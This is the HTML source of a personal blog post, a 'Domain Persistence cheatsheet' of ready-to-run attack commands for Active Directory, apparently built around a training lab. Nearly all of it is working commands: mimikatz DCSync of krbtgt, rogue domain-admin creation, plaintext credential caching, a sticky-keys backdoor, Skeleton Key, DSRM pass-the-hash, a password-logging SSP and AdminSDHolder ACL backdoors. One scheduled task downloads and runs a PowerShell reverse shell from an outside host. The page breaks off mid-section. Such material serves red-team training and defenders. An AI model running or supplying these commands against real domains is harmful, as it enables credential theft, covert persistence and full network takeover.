<!doctype html><!-- This site was created with Wowchemy. https://www.wowchemy.com --><!-- Last Published: February 26, 2023 --><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.242b882c3b0c00ae28b251add3931eef.css><link rel=stylesheet href=/css/libs/chroma/github-light.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><script async src="https://www.googletagmanager.com/gtag/js?id=G-NNZHY5233M"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}function trackOutboundLink(e,t){gtag("event","click",{event_category:"outbound",event_label:e,transport_type:"beacon",event_callback:function(){t!=="_blank"&&(document.location=e)}}),console.debug("Outbound link clicked: "+e)}function onClickCallback(e){if(e.target.tagName!=="A"||e.target.host===window.location.host)return;trackOutboundLink(e.target,e.target.getAttribute("target"))}gtag("js",new Date),gtag("config","G-NNZHY5233M",{}),gtag("set",{cookie_flags:"SameSite=None;Secure"}),document.addEventListener("click",onClickCallback,!1)</script><meta name=author content="Giovanni Pecoraro"><meta name=description content="Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access."><link rel=alternate hreflang=en-us href=https://www.peco602.com/post/0040-domain-persistence-cheatsheet/><link rel=canonical href=https://www.peco602.com/post/0040-domain-persistence-cheatsheet/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#3f51b5"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="@Peco602"><meta property="twitter:creator" content="@Peco602"><meta property="twitter:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:site_name" content="Giovanni Pecoraro"><meta property="og:url" content="https://www.peco602.com/post/0040-domain-persistence-cheatsheet/"><meta property="og:title" content="Domain Persistence cheatsheet | Giovanni Pecoraro"><meta property="og:description" content="Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access."><meta property="og:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-09-01T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-01T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.peco602.com/post/0040-domain-persistence-cheatsheet/"},"headline":"Domain Persistence cheatsheet","datePublished":"2022-09-01T00:00:00Z","dateModified":"2022-09-01T00:00:00Z","author":{"@type":"Person","name":"Giovanni Pecoraro"},"publisher":{"@type":"Organization","name":"Giovanni Pecoraro","logo":{"@type":"ImageObject","url":"https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"}},"description":"Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access."}</script><title>Domain Persistence cheatsheet | Giovanni Pecoraro</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=e7fa60aa0f16a9bb0c62ecf1be0a0412><script src=/js/wowchemy-init.min.7532de8e15162845d694f17af8b46a99.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Talks</span></a></li><li class=nav-item><a class=nav-link href=/#featured><span>Publications</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class="nav-item d-none d-lg-inline-flex"><a class=nav-link href=https://twitter.com/Peco602 data-toggle=tooltip data-placement=bottom title="Follow me on Twitter" target=_blank rel=noopener aria-label="Follow me on Twitter"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Domain Persistence cheatsheet</h1><p class=page-subtitle>Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access.</p><div class=article-metadata><div><span class=author-highlighted>Giovanni Pecoraro</span></div><span class=article-date>Sep 1, 2022</span>
<span class=middot-divider></span>
<span class=article-reading-time>7 min read</span>
<span class=middot-divider></span>
<span class=article-categories><i class="fas fa-folder mr-1"></i><a href=/category/cyber-security/>Cyber Security</a></span></div></div><div class=article-container><div class=article-style><p>The following techiniques require Domain Administrator privileges on the target domain.</p><h2 id=dcsync>DCSync</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Invoke-Mimikatz</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=err>“</span><span class=n>lsadump</span><span class=p>::</span><span class=n>dcsync</span> <span class=p>/</span><span class=n>domain</span><span class=err>:</span><span class=n>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=py>local</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=n>krbtgt</span><span class=err>”</span>
</span></span></code></pre></div><h2 id=adding-domain-admin-user>Adding domain admin user</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>net</span> <span class=n>user</span> <span class=n>jeff</span><span class=p>.</span><span class=py>ridges</span> <span class=n>FooBar123</span><span class=p>!</span> <span class=p>/</span><span class=n>add</span> <span class=p>/</span><span class=n>domain</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=nb>group </span><span class=s2>&#34;Administrators&#34;</span> <span class=n>jeff</span><span class=p>.</span><span class=py>ridges</span> <span class=p>/</span><span class=n>add</span> <span class=p>/</span><span class=n>domain</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=nb>group </span><span class=s2>&#34;Domain Admins&#34;</span> <span class=n>jeff</span><span class=p>.</span><span class=py>ridges</span> <span class=p>/</span><span class=n>add</span> <span class=p>/</span><span class=n>domain</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=nb>group </span><span class=s2>&#34;Enterprise Admins&#34;</span> <span class=n>jeff</span><span class=p>.</span><span class=py>ridges</span> <span class=p>/</span><span class=n>add</span> <span class=p>/</span><span class=n>domain</span>
</span></span></code></pre></div><h2 id=enabling-plaintext-credentials-caching-on-dcs>Enabling plaintext credentials caching on DCs</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>reg</span> <span class=n>add</span> <span class=s2>&#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&#34;</span> <span class=p>/</span><span class=n>v</span> <span class=n>UseLogonCredential</span> <span class=p>/</span><span class=n>t</span> <span class=n>REG_DWORD</span> <span class=p>/</span><span class=n>d</span> <span class=mf>1</span> <span class=p>/</span><span class=n>f</span>
</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=n>add</span> <span class=s2>&#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> <span class=p>/</span><span class=n>v</span> <span class=n>DisableDomainCreds</span> <span class=p>/</span><span class=n>t</span> <span class=n>REG_DWORD</span> <span class=p>/</span><span class=n>d</span> <span class=mf>0</span> <span class=p>/</span><span class=n>f</span>
</span></span></code></pre></div><h2 id=installing-a-sticky-keys-backdoor-on-dcs>Installing a sticky keys backdoor on DCs</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>reg</span> <span class=n>add</span> <span class=s2>&#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34;</span> <span class=p>/</span><span class=n>v</span> <span class=n>Debugger</span> <span class=p>/</span><span class=n>t</span> <span class=n>REG_SZ</span> <span class=p>/</span><span class=n>d</span> <span class=s2>&#34;C:\windows\system32\cmd.exe&#34;</span> <span class=p>/</span><span class=n>f</span><span class=s2>&#34;);
</span></span></span></code></pre></div><h2 id=scheduled-task>Scheduled Task</h2><p>Schedule and execute a task (needs a Silver Ticket for the HOST service)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>schtasks</span> <span class=p>/</span><span class=n>create</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;cyberlab-dc.cyberlab.cybercorp.local&#34;</span> <span class=p>/</span><span class=nb>SC </span><span class=n>Minute</span> <span class=p>/</span><span class=n>RU</span> <span class=s2>&#34;NT Authority\SYSTEM&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;TASK_NAME&#34;</span> <span class=p>/</span><span class=n>TR</span> <span class=s2>&#34;powershell.exe -ep bypass -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>schtasks</span> <span class=p>/</span><span class=n>run</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;cyberlab-dc.cyberlab.cybercorp.local&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;TASK_NAME&#34;</span>
</span></span><span class=line><span class=cl><span class=n>schtasks</span> <span class=p>/</span><span class=n>delete</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;cyberlab-dc.cyberlab.cybercorp.local&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;TASK_NAME&#34;</span>
</span></span></code></pre></div><h2 id=skeleton-key>Skeleton Key</h2><p>Use the below command to inject a skeleton key (password would be <em>mimikatz</em>) on a Domain Controller of choice (DA privileges required)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz.ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;misc::skeleton&#34;&#39;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>:: mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # privilege::debug
</span></span><span class=line><span class=cl>mimikatz # token::elevate
</span></span><span class=line><span class=cl>mimikatz # misc::skeleton
</span></span></code></pre></div><p>Now, it is possible to access any machine with a valid username and password as <em>mimikatz</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Enter-PSSession</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;cyberlab.cybercorp.local\Administrator&#34;</span>
</span></span></code></pre></div><p>In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>:: mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # privilege::debug
</span></span><span class=line><span class=cl>mimikatz # !+
</span></span><span class=line><span class=cl>mimikatz # !processprotect /process:lsass.exe /remove
</span></span><span class=line><span class=cl>mimikatz # misc::skeleton
</span></span><span class=line><span class=cl>mimikatz # !
</span></span></code></pre></div><h2 id=dsrm>DSRM</h2><p>There is a local administrator on every DC called <em>Administrator</em> whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.</p><p>Dump DSRM password (requires Domain Admin privileges):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;token::elevate&#34; &#34;lsadump::sam&#34;&#39;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc.cyberlab.cybercorp.local&#34;</span>
</span></span></code></pre></div><p>Enable logon through hash for DSRM:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>New-ItemProperty</span> <span class=s2>&#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34;</span> <span class=n>-Name</span> <span class=s2>&#34;DsrmAdminLogonBehavior&#34;</span> <span class=n>-Value</span> <span class=mf>2</span> <span class=n>-PropertyType</span> <span class=n>DWORD</span>
</span></span></code></pre></div><p>Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe&#34;&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe&#34;&#39;</span>
</span></span></code></pre></div><p>Now, it is possible to navigate through domain controller file system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>ls </span><span class=p>\\</span><span class=nb>cyberlab-dc</span><span class=p>.</span><span class=py>cyberlab</span><span class=p>.</span><span class=py>cybercorp</span><span class=p>.</span><span class=n>local</span><span class=p>\</span><span class=n>C</span><span class=p>$</span>
</span></span></code></pre></div><h2 id=custom-ssp>Custom SSP</h2><p>Add mililib.dll library to log every account access. Drop the <strong>mimilib.dll</strong> to <em>system32</em> and add mimilib to <em>HKLMPackages</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>packages</span> <span class=p>=</span> <span class=nb>Get-ItemProperty</span> <span class=n>HKLM</span><span class=err>:</span><span class=p>\</span><span class=n>SYSTEM</span><span class=p>\</span><span class=n>CurrentControlSet</span><span class=p>\</span><span class=n>Control</span><span class=p>\</span><span class=n>Lsa</span><span class=p>\</span><span class=n>OSConfig</span><span class=p>\</span> <span class=n>-Name</span> <span class=s1>&#39;Security Packages&#39;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=s1>&#39;Security Packages&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$packages</span> <span class=p>+=</span> <span class=s2>&#34;mimilib&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ItemProperty</span> <span class=n>HKLM</span><span class=err>:</span><span class=p>\</span><span class=n>SYSTEM</span><span class=p>\</span><span class=n>CurrentControlSet</span><span class=p>\</span><span class=n>Control</span><span class=p>\</span><span class=n>Lsa</span><span class=p>\</span><span class=n>OSConfig</span><span class=p>\</span> <span class=n>-Name</span> <span class=s1>&#39;Security Packages&#39;</span> <span class=n>-Value</span> <span class=nv>$packages</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ItemProperty</span> <span class=n>HKLM</span><span class=err>:</span><span class=p>\</span><span class=n>SYSTEM</span><span class=p>\</span><span class=n>CurrentControlSet</span><span class=p>\</span><span class=n>Control</span><span class=p>\</span><span class=n>Lsa</span><span class=p>\</span> <span class=n>-Name</span> <span class=s1>&#39;Security Packages&#39;</span> <span class=n>-Value</span> <span class=nv>$packages</span>
</span></span></code></pre></div><p>Using mimikatz, inject into lsass (Not stable with Server 2016):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;misc::memssp&#34;&#39;</span>
</span></span></code></pre></div><p>Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the <strong>c:\Windows\System32\mimilsa.log</strong> file.</p><h2 id=acl-right-abuse>ACL Right Abuse</h2><p>With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.</p><ol><li><p>Check if the user has replication rights on the domain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ObjectAcl</span> <span class=n>-DistinguishedName</span> <span class=s2>&#34;dc=cyberlab,dc=cybercorp,dc=local&#34;</span> <span class=n>-ResolveGUIDs</span> <span class=p>|</span> <span class=p>?{(</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-match</span> <span class=s2>&#34;STUDENT1&#34;</span><span class=p>)</span> <span class=o>-and</span> <span class=p>((</span><span class=nv>$_</span><span class=p>.</span><span class=py>ObjectType</span> <span class=o>-match</span> <span class=s1>&#39;replication&#39;</span><span class=p>)</span> <span class=o>-or</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>ActiveDirectoryRights</span> <span class=o>-match</span> <span class=s1>&#39;GenericAll&#39;</span><span class=p>))}</span>
</span></span></code></pre></div></li><li><p>Add FullControl rights to the domain object:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Add-ObjectAcl</span> <span class=n>-TargetDistinguishedName</span> <span class=s2>&#34;DC=cyberlab,DC=cybercorp,DC=local&#34;</span> <span class=n>-PrincipalSamAccountName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Rights</span> <span class=n>All</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ADACL</span> <span class=n>-DistinguishedName</span> <span class=s2>&#34;DC=cyberlab,DC=cybercorp,DC=local&#34;</span> <span class=n>-Principal</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>or just add rights for DCSync and perform it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Add-ObjectAcl</span> <span class=n>-TargetDistinguishedName</span> <span class=s2>&#34;DC=cyberlab,DC=cybercorp,DC=local&#34;</span> <span class=n>-PrincipalSamAccountName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Rights</span> <span class=n>DCSync</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ADACL</span> <span class=n>-DistinguishedName</span> <span class=s2>&#34;DC=cyberlab,DC=cybercorp,DC=local&#34;</span> <span class=n>-Principal</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-GUIDRight</span> <span class=n>DCSync</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Check if the rights have been correctly added:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ObjectAcl</span> <span class=n>-DistinguishedName</span> <span class=s2>&#34;dc=cyberlab,dc=cybercorp,dc=local&#34;</span> <span class=n>-ResolveGUIDs</span> <span class=p>|</span> <span class=p>?{(</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-match</span> <span class=s2>&#34;STUDENT1&#34;</span><span class=p>)</span> <span class=o>-and</span> <span class=p>((</span><span class=nv>$_</span><span class=p>.</span><span class=py>ObjectType</span> <span class=o>-match</span> <span class=s2>&#34;replication&#34;</span><span class=p>)</span> <span class=o>-or</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>ActiveDirectoryRights</span> <span class=o>-match</span> <span class=s2>&#34;GenericAll&#34;</span><span class=p>))}</span>
</span></span></code></pre></div></li><li><p>With replication rights the user can get the hash of <em>krbtgt</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Invoke-Mimikatz</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;lsadump::dcsync /user:cyberlab\krbtgt&#34;&#39;</span>
</span></span></code></pre></div></li></ol><h2 id=adminsdholder>AdminSDHolder</h2><p>With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the members of groups like Domain Admins without actually being a member of it.</p><ol><li><p>Check AdminSDHolder permissions (as normal user):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ObjectAcl</span> <span class=n>-ADSprefix</span> <span class=s2>&#34;CN=AdminSDHolder,CN=System&#34;</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-like</span> <span class=s2>&#34;CYBERLAB\STUDENT1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-Acl</span> <span class=n>-Path</span> <span class=s2>&#34;AD:\CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&#34;</span><span class=p>).</span><span class=py>Access</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-like</span> <span class=s2>&#34;CYBERLAB\STUDENT1&#34;</span><span class=p>}</span>
</span></span></code></pre></div></li><li><p>Add <strong>FullControl</strong> permissions for a user to the AdminSDHolder</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Add-ObjectAcl</span> <span class=n>-TargetADSprefix</span> <span class=s2>&#34;CN=AdminSDHolder,CN=System&#34;</span> <span class=n>-PrincipalSamAccountName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Rights</span> <span class=n>All</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ADACL</span> <span class=n>-DistinguishedName</span> <span class=s2>&#34;CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&#34;</span> <span class=n>-Principal</span> <span class=s1>&#39;STUDENT1&#39;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>but there are also other interesting permissions (<strong>ResetPassword</strong>, <strong>WriteMembers</strong>) for a user to the AdminSDHolder:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Add-ObjectAcl</span> <span class=n>-TargetADSprefix</span> <span class=s2>&#34;CN=AdminSDHolder,CN=System&#34;</span> <span class=n>-PrincipalSamAccountName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Rights</span> <span class=n>ResetPassword</span> <span class=n>-VerboseAdd-ObjectAcl</span> <span class=n>-TargetADSprefix</span> <span class=s2>&#34;CN=AdminSDHolder,CN=System&#34;</span> <span class=n>-PrincipalSamAccountName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Rights</span> <span class=n>WriteMembers</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Run SDProp manually using Invoke-SDPropagator.ps1 (requires DA privileges):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Pre-Server 2008 machines</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Invoke-SDPropagator</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SDPropagator</span> <span class=n>-taskname</span> <span class=n>FixUpInheritance</span> <span class=n>-timeoutMinutes</span> <span class=mf>1</span> <span class=n>-showProgress</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Server 2008 and beyond</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Invoke-SDPropagator</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SDPropagator</span> <span class=n>-timeoutMinutes</span> <span class=mf>1</span> <span class=n>-Domain</span> <span class=s2>&#34;CYBERLAB.LOCAL&#34;</span> <span class=n>-showProgress</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Verify the successful update of Domain Admins ACL (as normal user):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ObjectAcl</span> <span class=n>-SamAccountName</span> <span class=s2>&#34;Domain Admins&#34;</span> <span class=n>-ResolveGUIDs</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-like</span> <span class=s2>&#34;CYBERLAB\STUDENT1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
